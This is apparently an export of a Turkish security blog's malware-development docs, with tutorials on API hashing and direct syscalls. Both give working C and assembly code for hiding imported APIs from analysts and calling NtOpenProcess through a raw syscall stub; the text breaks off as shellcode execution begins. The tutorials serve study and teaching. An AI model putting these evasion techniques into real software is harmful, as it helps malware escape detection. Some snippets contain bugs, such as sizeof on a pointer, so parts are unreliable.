{"/tr/about/":{"data":{"":"\nMerhabalar efenimm, bloguma hoş geldiniz! 👋\nBen Berkay ama genelde bekoo olarak biliniyorum. 19 yaşındayım ve son 4 yıldır kendimi siber güvenliğe adamış bir araştırmacıyım. Özellikle şu alanlarda yoğunlaşıyorum:\n🔍 Reverse Engineering\n🐛 Malware Analysis\n⚙️ Malware Development\nBloglarımı ve dökümanlarımı hem Türkçe hem İngilizce hazırlıyorum. İngilizce içerik zaten bolca bulunuyor ama Türkçe kaynakların kısıtlı olduğunun farkındayım. Bu yüzden elimden geldiğince Türkçe içerik eklemeye, konuları net ve anlaşılır şekilde anlatmaya özen gösteriyorum.\n📌 Önemli not: Buradaki hiçbir içerik illegal amaç taşımamaktadır ve okuyucuyu illegal aktivitelere teşvik etmez. Eğer burada anlatılanları gerçek senaryolarda uygularsanız, sorumluluk tamamen size aittir. Amacım sadece araştırma yapanlara kaynak sağlamaktır.\nUmarım burada paylaştıklarım işinize yarar. Eğer kafanıza takılan bir konu olursa, yanlış bilgi verdiğimi düşünürseniz veya sadece sohbet etmek isterseniz, bana yazmaktan çekinmeyin. Sorularınızı yanıtlamak, yanlışımı düzeltmek ya da birlikte yeni şeyler öğrenmek benim için büyük bir mutluluk olur.\nKeyifli okumalar ve bol araştırmalar dilerim! 🚀"},"title":"About"},"/tr/docs/":{"data":{"":"Bu sitede, dökümanlar için üç kategoride paylaşım yapılmaktadır:\nMalware Development\rWindows Kernel Development\rUEFI Development"},"title":"Documentation"},"/tr/docs/malware-dev/":{"data":{"":"Malware Development ile ilgili konuları incelemek için aşağıdaki bölümlere göz atabilirsiniz:\nMalware Resurrection\rFile Spoofing\rAPI Hashing\rDirect Syscalls\rNTAPI Injection\rDLL Injection\rShellcode Injection"},"title":"Malware Development"},"/tr/docs/malware-dev/api-hashing/":{"data":{"":"","api-hashing-nedir#API Hashing Nedir?":"","apinin-adresini-bulma#API’nin Adresini Bulma":"","eat-export-address-table-ve-iat-import-address-table-nedir#EAT (Export Address Table) ve IAT (Import Address Table) Nedir?":"","modülün-base-addressini-bulma#Modülün Base Address’ini Bulma":"","pe-portable-executable-yapısı-nedir#PE (Portable Executable) Yapısı Nedir?":"","references#References":"Merhabalar. Bu yazıda, maldev alanındaki API Hashing yöntemini ele alacağım.\nPE (Portable Executable) Yapısı Nedir? Her şeyden önce PE (Portable Executable) yapısını anlamanın gerekli olduğunu düşünüyorum çünkü bu tekniğimiz tamamen bu yapı üzerine.\nPE, Windows işletim sistemlerinde 32 ve 64 bit sürümlerde ve UEFI ortamlarda kullanılan executable dosyalar, object kodlar, DLL’ler ve diğerleri için bir dosya biçimidir. PE, Windows İşletim sistemi loader’in yürütülmek istenilen kodu yönetmesi için gereken veri yapıları içermektedir.\nBir PE dosyası, dinamik linker’a (dynamic linker) yürütülebilir dosyanın dosya belleğin nasıl eşleceğini ve çalıştırılacağını belirten bir dizi başlık ve bölümden oluşur. Bu başlıklar ve bölümler, işletim sisteminin dosyayı doğru şekilde yüklemesine ve çalıştırmasına olanak tanır.\nPE yapısında bulunan bazı önemli başlıklar şunlardır:\nDOS Header (IMAGE_DOS_HEADER): Bu başlık, eski MS-DOS işletim sistemleri tarafından yürütülebilir dosyanın tanınması için gerekli minimum bilgileri içerir.\nDOS Stub: Bu, yürütülebilir bir dosyanın başlangıcında bulunan ve DOS işletim sistemi tarafından tanınması için gereken minimum bilgileri içerir. Bu, dosyanın yürütülebilir olup olmadığını belirlemek için kullanılır.\nPE Header (IMAGE_NT_HEADERS): Bu başlık, PE formatına özgü önemli bilgileri içerir. İşletim sisteminin dosyayı doğru şekilde yüklemesi ve çalıştırması için gerekli olan dosya boyutu, giriş noktası adresi, isteğe bağlı DLL’ler ve diğer bilgiler buradadır.\nFile Header (IMAGE_FILE_HEADER): Bu başlık, dosyanın genel bilgilerini içerir. Dosyanın mimarisi, dosya türü, bölümler ve diğer bilgiler burada bulunur.\nOptional Header (IMAGE_OPTIONAL_HEADER): Bu başlık, dosyanın yüklenmesi ve çalıştırılması için gerekli olan bilgileri içerir. Dosyanın mimarisi, dosya türü, bölümler ve diğer bilgiler burada bulunur.\nEAT (Export Address Table) ve IAT (Import Address Table) Nedir? EAT ve IAT, PE dosyalarında bulunan iki önemli tablodur. Bu tablolar, dosyanın yürütülmesi sırasında işletim sistemi tarafından kullanılan fonksiyonların adreslerini ve adlarını içerir.\nEAT (Export Address Table): Dışa Aktarım Adres Tablosu olan EAT, bir PE dosyasının dışarı aktardığı fonksiyonların adreslerini ve adlarını içeren bir tablodur. Bu tablo, dinamik linker’ın (dynamic linker) yürütülebilir dosyayı yüklerken ve çalıştırırken hangi fonksiyonların kullanılabileceğini belirlemesine yardımcı olur. Bunu özellikle aklınızda tutun çünkü ileride bu tablo üzerinde işlem yapacağız.\nIAT (Import Address Table): İçe Aktarım Adres Tablosu olan IAT, bir PE dosyasının diğer PE dosyalarından içe aktardığı fonksiyonların adreslerini ve adlarını içeren bir tablodur. Aynı şekilde bu tabloda dinamik linker’ın yürütülebilir dosyayı yüklerken ve çalıştırırken hangi fonksiyonların içe aktarılması gerektiğini belirlemesine yardımcı olur.\nAPI Hashing Nedir? API Hashing, bir API fonksiyonunun adını veya diğer tanımlayıcı özelliklerini bir hash değerine dönüştüren bir tekniktir. Bu hash değeri, fonksiyonun kimliğini temsil etmek için kullanılır. API’ların adlarını ve adreslerini gizlemek için kullanılabilir.\nÖrneğin, MessageBoxA fonksiyonunu içeren bir projeyi derleyip çalıştırdığımızı düşünelim. Projemizde MessageBoxA kullandığımız için derleme sırasında derleyici (compiler), MessageBoxA API’sinin adresini Import Address Table (IAT) tablosuna ekleyecektir. Bu, programı çalıştırdığımızda MessageBoxA API’sinin bu adresten erişilebileceği anlamına gelir.\nAncak, MessageBoxA’nın adresini gizlemek istiyorsak ne yapabiliriz? İşte burada API hashing devreye girer. Malware’i analiz eden bir kişi, malware’da kullanılan API’ları IAT içerisinde rahatlıkla görebilir. Bu nedenle, projemizde bu API’lara farklı isimler vererek ve ardından bu farklı isimleri hashleyerek IAT’a eklersek, analiz eden kişi bu API’ları kolayca göremez. Temelde, API hashing yöntemi budur: İlgili API’nin adını değiştirip hashleyerek ve sonra IAT tablosuna ekleyerek gizlemek.\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } int main() { DWORD hash_value = CalculateHash(\"CreateThread\"); printf(\"CreateThread: 0x%00x\\n\", hash_value); getchar(); return 0; } Yukarıdaki örnekte, verilen API’in hash değerini hesaplayan basit bir kod parçası hazırlanmıştır. İlk olarak API’nin adı alınır ve hesap yapacak CalculateHash fonksiyonuna gönderilir.\nFonksiyon içerisinde hash adında ve 0x99 değer tutan bir DWORD değişkeni oluşturduk. Bu değer, hesaplamanın başlangıç ​​noktası olarak kullandık.\nDaha sonra bir döngü başlattık. Bu döngüde, mevcut hash değerini 0xab10f29f sabit değeri ile çarpılır. Bu, her karakterin karma değerine katkısını artırmaya yardımcı olur. Mevcut karakterin değeri, çarpılan değere eklenir. Son olarak ise sonuç, 0xffffff değeri ile bitsel AND işlemine tabi tutulur. Bu, karma değerinin 32 bitlik bir tamsayı olarak kalmasını sağlar. Bu basit bir projedir ve ilerdeki süreçlerde bu fonksiyonu kullanacağız.\nModülün Base Address’ini Bulma Şimdi, API’nin adresini bulma işlemine geçeceğiz. Adım adım WinDbg kullanarak, işlem modüllerini ve API’ları nasıl sıralandığını ve PE (Portable Executable) yapısını nasıl görebileceğimizi öğreneceğiz. Ardından, bu bilgileri C projesine uygulayacağız.\nİlk olarak, çalışan bir işlemin PEB yapısını inceleyerek, işlemin modüllerinin taban adreslerine göz atacağız. Belirtmek gerekirse, PEB, bir işlemin çalışma zamanı bilgilerini içeren bir yapıdır. Bu yapı, işlemin modüllerinin taban adreslerini, heap ve stack bilgilerini, çevresel değişkenlerini ve diğer bilgileri içerir.\n64 bit işlemlerde, PEB, Thread Environment Block bloğundan 0x60 ofsette bulunur. TEB, yürütülen iş parçacığının çalışma zamanı bilgilerini içeren bir yapıdır. TEB yapısı, GS segment kaydı tarafından işaretlenir. Dolayısıyla, PEB yapısına GS segment kaydı ile GS:[0x60] adresinden erişilebilir.\nŞimdi, cmd.exe’yi çalıştıralım ve WinDbg kullanarak analize başlayalım:\nİlk olarak dt komutu ile TEB’in yapısını inceleyerek başlayabiliriz:\nBurada dikkatimizi çeken kısım +0x060 ProcessEnvironmentBlock : 0x000000fc4bacf000 _PEBolması yeterlidir. Yukarıda TEB ve PEB’ten bahsetmiştik ve burada TEB içerisinde PEB’in adresini görmekteyiz. Şimdi ise bu PEB’in adresi ile bu yapıya bir göz atalım:\nYakından ilgili process’in PEB yapısını böylece görmüş olduk. Burada bizi ilgilendiren kısım +0x018 Ldr: 0x00007ffe`c5c153e0 _PEB_LDR_DATA olacaktır. Bu yapı, yüklenen modüllerin listesini içerir. Şimdi ise bu yapıya bir göz atalım:\nBu yapıya göz attığımızda üç farklı liste olduğunu görmekteyiz. Bu listeler, yüklenen modüllerin listesini temsil eder. Bu listelerin içerisinde bulunan yapılar ise LDR_DATA_TABLE_ENTRY yapısına aittir. Bu yapı, yüklenen modülün bilgilerini içerir.\nBu listeleri tanımadan önce LIST_ENTRY yapılarını anlamamiz lazım:\nFlink: İlgili yapıyı işaret eden bir sonraki yapıdır. Blink: İlgili yapıyı işaret eden bir önceki yapıdır. Şimdi ise listeleri tanıyalım:\nInLoadOrderModuleList: Modüllerin yüklenme sırasını temsil eder.\nInMemoryOrderModuleList: Modüllerin belleğe yüklenme sırasını temsil eder.\nInInitializationOrderModuleList: Modüllerin başlatılma sırasını temsil eder.\nBu listelerden ana odağımız InLoaderOrderModuleList olacaktır. Bu listenin modüllerin yüklenme sırasını temsil ettiğinden bahsetmiştik. Şimdi ise bu liste üzerinde işlem yaparak yüklenen modülleri tek tek göz atacağız.\nİlk olarak InLoadOrderModuleList yapısındaki 0x000002c0`f1e23690 adres, yüklenen ilk modülün adresidir. Bu adresi kullanarak ilk yüklenilen modüle göz atabiliriz:\nİlk yüklenen modülün detaylı bilgilerini fotoğrafta görülebileceği üzere yakından görebiliyoruz. İlk yüklenen modül cmd.exe adıyla ilgili executable dosyanın modülü olduğunu görmekteyiz. Dllbase, ilgili modülün base addressini içerir. BaseDllName ise yüklenen modülün ismi. Bunları görmemiz yeterlidir araştırma için.\nAraştırmalara devam etmek için bir sonraki yüklenen modüle geçebiliriz:\nYüklenen diğer modülün ntdll.dll olduğunu görmekteyiz. Bu şekilde yüklenen tüm modülleri tek tek inceleyebiliriz. Son olarak diğer modüle de göz atalım:\nDiğer yüklenen modüle göz attığımızda ise kernel32.dll olduğunu görmekteyiz.\nŞimdi ise odağımızı C projemize çevireceğiz. Bu öğrendiklerimizi ise C projesine dökeceğiz.\nIDE içerisinde bu yapılar tanımlı olmadığı için elle kendimiz tamamlamamız gerekmektedir. Şimdi ise kodlamaya geçebiliriz:\n#include \"utils.h\" DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } DWORD CalcModuleHash(LDR_MODULE* ModuleLink) { char* ModuleName[64]; size_t counter = 0x0; while (ModuleLink-\u003eBaseDllName.Buffer[counter] \u0026\u0026 counter \u003c sizeof(ModuleName) - 1) { ModuleName[counter] = (char)ModuleLink-\u003eBaseDllName.Buffer[counter]; counter++; } ModuleName[counter++] = 0; return CalculateHash((char*)CharLowerA(ModuleName)); } HMODULE GetModuleBaseAddress(DWORD Hash) { HMODULE ModuleBaseAddress = NULL; INT_PTR PEB\t= __readgsqword(0x60);\t// PEB'in offseti INT_PTR LDR\t= 0x18;\t// PEB içerisindeki LDR'in offseti INT_PTR FlinkOffset\t= 0x10;\t// InLoadOrderModuleList'in offseti INT_PTR PEB_LDR_DATA = *(INT_PTR*)(PEB + LDR);\t// PEB içerisinden LDR'e ulaş INT_PTR FirstFlink = *(INT_PTR*)(PEB_LDR_DATA + FlinkOffset); // LDR içerisinden InLoadOrderModuleList yapısına ulaş LDR_MODULE* LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)FirstFlink; do { /* Buradaki döngü, process'e yüklenen tüm modül listesi üzerinde işlem yapar. Yüklenen her modülün base address'i ve hash değeri alınır ve kontrol yapılır. */ LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)LDR_DATA_TABLE_ENTRY-\u003eInLoadOrderModuleList.Flink; if (LDR_DATA_TABLE_ENTRY-\u003eBaseAddress != NULL) { if (CalcModuleHash(LDR_DATA_TABLE_ENTRY) == Hash) { break; } } } while (FirstFlink != (INT_PTR)LDR_DATA_TABLE_ENTRY); ModuleBaseAddress = (HMODULE)LDR_DATA_TABLE_ENTRY-\u003eBaseAddress; return ModuleBaseAddress; } Bu kod parçasında, öncelikle CalculateHash fonksiyonu ile API’nin hash değeri hesaplanmaktadır. Daha sonra CalcModuleHash fonksiyonu, bir modülün ismini alır ve bu ismin hash değerini hesaplar. İşlem sırasında modül ismi küçük harfe dönüştürülür ve her karakterin ASCII değeri ile önceki hash değeri kullanılarak yeni bir hash değeri hesaplanır.\nSon olarak, GetModuleBaseAddress fonksiyonu, verilen bir hash değeriyle eşleşen bir modül bulur ve bu modülün başlangıç adresini döndürür. Bunun için, işlem yüklenen modül listesi üzerinde döngü yapar ve her bir modülün hash değeri CalcModuleHash ile hesaplanarak kontrol edilir. Eşleşme bulunduğunda, ilgili modülün başlangıç adresi döndürülür.\nAncak bu kod parçasını kullanmamıza gerek yok. Zaten bunları yapan hazır API’lar bulunmaktadır.\nAPI’nin Adresini Bulma Base Address’i bulduktan sonra API’in adresini bulmamız gerekiyor. Bunun için ihtiyacımız olan şey, IMAGE_EXPORT_DIRECTORY yapısıdır. Bu yapı, Export Address Table’ın (EAT) adresini içerir. Bu yapıda içeren bazı önemli alanlar şunlardır:\nNumberOfFunctions: Export edilen fonksiyonların sayısı AddressOfFunctions: Export edilen fonksiyonların adreslerinin bulunduğu tablonun adresi AddressOfNames: Export edilen fonksiyonların isimlerinin bulunduğu tablonun adresi Windbg’a dönelim ve ntdll’in EAT tablosunu bularak başlayalım:\nntdll’in yüklü olduğu adresin 00007ffe`c5a90000 olduğunu görebiliyoruz. Şimdi bu adresten IMAGE_DOS_HEADER yapısına ulaşalım:\nIMAGE_DOS_HEADER yapısının adresini bulduktan sonra IMAGE_NT_HEADERS yapısına ulaşacağız.\nBu yapının adresini bulmak için IMAGE_DOS_HEADER yapısının e_lfanew’in hex değeri, ntdll’in adresine ekleyerek elde edebiliriz. Böylece IMAGE_NT_HEADERS yapısına ulaşabiliriz:\nDaha sonra araştırmamıza _IMAGE_OPTIONAL_HEADER64’a (0x18) ulaşarak devam edeceğiz:\n0:004\u003e dt _IMAGE_OPTIONAL_HEADER64 00007ffe`c5a90000+0xe0+0x18\rntdll!_IMAGE_OPTIONAL_HEADER64\r+0x000 Magic : 0x20b\r+0x002 MajorLinkerVersion : 0xe ''\r+0x003 MinorLinkerVersion : 0x1e ''\r+0x004 SizeOfCode : 0x130000\r+0x008 SizeOfInitializedData : 0xe5000\r+0x00c SizeOfUninitializedData : 0\r+0x010 AddressOfEntryPoint : 0\r+0x014 BaseOfCode : 0x1000\r+0x018 ImageBase : 0x00007ff9`373b0000\r+0x020 SectionAlignment : 0x1000\r+0x024 FileAlignment : 0x1000\r+0x028 MajorOperatingSystemVersion : 0xa\r+0x02a MinorOperatingSystemVersion : 0\r+0x02c MajorImageVersion : 0xa\r+0x02e MinorImageVersion : 0\r+0x030 MajorSubsystemVersion : 0xa\r+0x032 MinorSubsystemVersion : 0\r+0x034 Win32VersionValue : 0\r+0x038 SizeOfImage : 0x216000\r+0x03c SizeOfHeaders : 0x1000\r+0x040 CheckSum : 0x21eed5\r+0x044 Subsystem : 3\r+0x046 DllCharacteristics : 0x4160\r+0x048 SizeOfStackReserve : 0x40000\r+0x050 SizeOfStackCommit : 0x1000\r+0x058 SizeOfHeapReserve : 0x100000\r+0x060 SizeOfHeapCommit : 0x1000\r+0x068 LoaderFlags : 0\r+0x06c NumberOfRvaAndSizes : 0x10\r+0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY Dikkatimizi 0x70 offsetine yani IMAGE_DATA_DIRECTORY yapısına çekiyoruz. Bu yapı, Export Address Table’ın RVA’sı (Relative Virtual Address) gibi Import Address Table için önemli bilgileri tutar.\nIMAGE_EXPORT_DIRECTORY yapısı ise şu şekildedir:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY; Şimdi ise bu bilgilerin ışığında API’in adresini bulmak için C projemize aşağıdaki kodu ekleyeyelim:\nPDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiş fonksiyonlarla ilgili bilgiler için RVA'ları al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alınan Export fonksiyonun hash değerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastır ve main'e dön if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } Bu kod parçasında, getFunctionAddressByHash fonksiyonu, verilen bir hash değeriyle eşleşen bir API’nin adresini bulur ve döndürür. Bunun için, verilen kütüphane adını yükler ve IMAGE_EXPORT_DIRECTORY yapısını kullanarak Export Address Table’ın adresini alır.\nDaha sonra bu yapıdaki adresler kullanılarak, Export edilen fonksiyonların adreslerinin bulunduğu tablo ve isimlerin bulunduğu tablo adresleri alınır. Daha sonra, bu tablolar üzerinde döngü yaparak, her bir fonksiyonun adını ve hash değerini hesaplar. Eşleşme bulunduğunda, ilgili fonksiyonun adresi döndürülür.\nKodun tamamını birleştirelim ve basitçe CreateThread API’sini çalıştıralım:\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cWindows.h\u003e typedef struct HANDLE(NTAPI* MyCreateThread)( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x35; for (size_t i = 0; i \u003c stringLength; i++) { hash += (hash * 0xab10f29f + string[i]) \u0026 0xffffff; } return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiş fonksiyonlarla ilgili bilgiler için RVA'ları al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alınan Export fonksiyonun hash değerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastır ve main'e dön if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } int main() { DWORD hash = getHashFromString(\"CreateThread\"); PDWORD functionAddress = getFunctionAddressByHash((char*)\"kernel32\", hash); DWORD TID = 0; HANDLE th = CreateThread(NULL, 0, NULL, NULL, 0, \u0026TID); if (th == NULL) { printf(\"Failed to create thread\\n\"); return -1; } printf(\"Thread created successfully\\n\"); CloseHandle(th); return 0; } Sonuca baktığımızda ise başarılı bir şekilde API’in adresinin alındığını ve çalıştırıldığını görmekteyiz.\nReferences EN Wikipedia - Portable Executable Tech Zealots - A Comprehensive Guide To PE Structure, The Layman’s Way Red Team Notes - Windows API Hashing in Malware Cognisys Labs - Combining Indirect Dynamic Syscalls and API Hashing "},"title":"API Hashing"},"/tr/docs/malware-dev/direct-syscalls/":{"data":{"":"","direct-systemcall-ile-shellcode-çalıştırma#\u003cstrong\u003eDirect Systemcall ile Shellcode Çalıştırma\u003c/strong\u003e":"","direct-systemcall-yöntemi#\u003cstrong\u003eDirect Systemcall Yöntemi\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazıda Direct System Calls konusuna değineceğiz.\nSystem Call Nedir? Warning\nOkuyucunun NTAPI Injection blogunda anlatılan NTAPI mekanizması, user-mode ve kernel-mode arasındaki temel farklar gibi konularda bilgisi olduğu varsayılmıştır.\nDirekt olarak tekniğe geçmeden önce syscall nedir bunu anlamamız gerekiyor.\nBir sistem çağrısı (system call), bir programın işletim sisteminden bir hizmet talep etmesinin programatik yoludur. Daha basit olarak, kullanıcı modunda (user mode) çalışan bir programın çekirdek moduna (kernel mode) geçmesini sağlayan bir komuttur. Windows gibi işletim sistemlerinde, kullanıcı modunda çalışan bir program, bir sistem çağrısı yaparak işletim sisteminin çekirdek modunda çalışan servislerine ulaşır. Bu geçiş, CPU’nun işletim sistemi tarafından yönetilen çekirdek moduna geçmesiyle gerçekleşir.\nSöz konusu Windows API olduğunda, bir user-mode program tarafından çağırılan WIN32 API’in çalıştırılması için user-mode alanından kernel-mode alana geçici geçişi (geçiş CPU anahtarı) sağlayan bir komuttur.\nKafanıza daha iyi oturması için diyagram üzerinden ilerleyelim:\nNTAPI Injection blogumu okuduysanız bu diyagram yabancı gelmeyecektir. Fakat yine de özet geçmekte fayda var.\nDiyelim ki user-mode programdan OpenProcess API’i çağırdık. Bu API’ların orijinal adresleri kernel alanından ntoskrnl.exe‘de tutulduğu için user-mode alanından kernel-mode’a yönlendirilmesi gerekiyor. Bu API’in ilk durağı kernel32.dll alanından OpenProcess olacaktır ve sonra user-mode alanın son durağı olan ntdll.dll kütüphanesine giderek NtOpenProcess haline dönüşür. Konumuzilgisi olan SYSCALL tam burada devreye giriyor. ntdll.dll’den sonra adımlar kernel alanından devam edeceği için kernel-mode alana yönlendirilmesi gerekiyor.\nSYSCALL çalıştıktan sonra ise kernel-mode alana geçiş yapılarak SSDT tablosuna yönlendirilir NtOpenProcess‘in orijinal adresi hesaplanır ve ntoskrnl.exe’den adrese yönlendirilir. Eğer SSDT tablosu hakkında bilgi sahibi olmak isterseniz SSDT bloguma göz atabilirsiniz.\nFakat yapılan bu syscall’lar direkt olarak belirsiz bir şekilde yapılmıyor. Hangi API’in çalıştırıldığı anlaşılması için her NTAPI için bir syscall numarası bulunur. Bu numaralar, işletim sistemi versiyonuna göre değişiklik gösterebilir ve genellikle kernel seviyesinde tanımlıdır. Böylece program’ın hangi API’i çalıştırmak istendiği belirlenmiş olur.\nMesela Windbg ile ntdll.dll’den NtOpenProcess’in syscall numarasına göz atabiliriz:\nBir syscall yapıldığında ssn yani syscall numarası eax’a aktarılır. Fotoğrafta eax’a aktarılan değerin 0x26 olduğunu görebiliriz.\nDirect Systemcall Yöntemi Direct Systemcall yöntemi, adından da anlaşılabileceği gibi, user-mode programlardan doğrudan syscall yapmayı içeren bir tekniktir. Bu yöntem, arada herhangi bir kütüphaneye (şemadan gördüğümüz gibi kernel32.dll vs.) gitmeden, doğrudan syscall yapılır.\nYıllar geçse de sıkılmayacağımız örnek olan NtOpenProcess’i kullanarak bir syscall örneği yapalım. Kafamıza daha iyi oturacaktır.\nAssembly Projenin Kodlanması Hatırlarsanız NTAPI Injection konusunda NtOpenProcess çalıştırmak için yapısını tanımlıyorduk. Bu yöntemle beraber projede bir .asm dosyası oluşturacağız. Bunun nedeni ise yapılan syscall’lar assembly yani daha düşük seviyede yapılır. Bu yüzden direkt olarak C kodlarıyla syscall yapamayız.\nVisual Studio’da oluşturduğumuz projeye sağ tıklayalım ve Build Dependencies \u003e Build Customizations‘a tıklayalım:\nAçılan ekrandan masm kutucuğunu işaretleyelim:\nDaha sonra bir .asm projesi oluşturalım ve oluşturulan projeye sağ tıklayıp Properties seçeneğine tıklayalım:\nProperties’e tıkladıktan sonra Excluded From Build seçeneğini No olarak işaretleyelim.\nDaha sonra oluşturduğumuz assembly dosyasını kodlayalım:\n.code My_NtOpenProcess proc mov r10,rcx mov eax,26h syscall ret My_NtOpenProcess endp end Bu kodda gördüğünüz gibi 0x26 ssn ile syscall yapıyoruz. C projemizde My_NtOpenProcess fonksiyonunu çağırdığımızda akış buraya aktarılacak.\nC Projenin Kodlanması Şimdi ise main.h adında bir header dosyası oluşturalım ve aşağıdaki kodları yapıştırın:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; extern NTSTATUS My_NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); Artık bu yapıların ne için kullanıldığını biliyoruz. extern ile assembly projesinde oluşturduğumuz My_NtOpenProcess‘i tanımladığımıza dikkat edin.\nArtık main.c projesini kodlayabiliriz:\n#include \"main.h\" int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed with status: 0x%08x\\n\", Status); return -1; } printf(\"HandleProcess: 0x%p\\n\", HandleProcess); return 0; } NTAPI Injection konusundan sonra kodlar artık bize yabancı gelmeyecektir. Programı çalıştıralım ve sonuçlara göz atalım:\nGöründüğü gibi başarılı bir şekilde NtOpenProcess çalışıyor. Yine de arka planda neler olduğunu daha yakından görmek için Windbg kullanabiliriz:\nmain fonksiyondan My_NtOpenProcess’i çağırdığımız kısma bir bp koyalım ve adım adım neler yaptığına bir göz atalım:\nGöründüğü gibi Assembly projesinde oluşturduğumuz fonksiyona yöneliyor ve artık bu kısımdan sonra akış kernel’a yönelecek.\nYaptığımız adımın diyagramını oluşturabiliriz böylece daha iyi anlayabiliriz:\nDirect Systemcall ile Shellcode Çalıştırma Öncelikle oluşturduğumuz Assembly projesini aşağıdaki kod ile 